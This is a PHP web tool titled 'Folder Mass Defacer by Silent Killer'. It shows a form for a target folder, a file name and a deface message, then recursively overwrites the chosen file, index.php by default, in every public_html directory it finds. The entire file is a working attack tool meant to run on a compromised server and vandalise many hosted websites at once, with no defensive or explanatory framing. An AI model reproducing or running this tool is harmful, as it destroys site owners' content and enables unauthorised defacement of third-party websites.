<?php

echo "<title>Folder Mass Defacer by Silent Killer</title>";

echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";

echo "<body bgcolor='gray'><font color='black'><font face='Electrolize'>";

echo "<center><form method='POST'>";

echo "<img src='https://image.spreadshirtmedia.net/image-server/v1/designs/14727496,width=178,height=178,version=1385625201/fuck-anonymous-mask.png'>

<hr color='black'><font color='black'>Target Folder</font><br>

<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";

echo "<font color='black'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";

echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by 70X1C P#4N70M</textarea><br>";

echo "<input type='submit' value='Mass !!!'></form></center>";

function deface($dir, $file_name, $content) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                // Check if it is the public_html directory
                if (basename($path) == 'public_html') {
                    $index = $path . '/' . $file_name;
                    if (file_put_contents($index, $content)) {
                        echo "<hr color='black'>>> <font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(✔)</font>";
                    }
                } else {
                    // Recursively go deeper into directories
                    deface($path, $file_name, $content);
                }
            }
        }
    }
}

if (isset($_POST['base_dir'])) {

    if (!file_exists($_POST['base_dir'])) {
        die($_POST['base_dir'] . " Not Found !<br>");
    }

    if (!is_dir($_POST['base_dir'])) {
        die($_POST['base_dir'] . " Is Not A Directory !<br>");
    }

    @chdir($_POST['base_dir']) or die("Cannot Open Directory");

    deface(getcwd(), $_POST['andela'], $_POST['index']);
}

?>
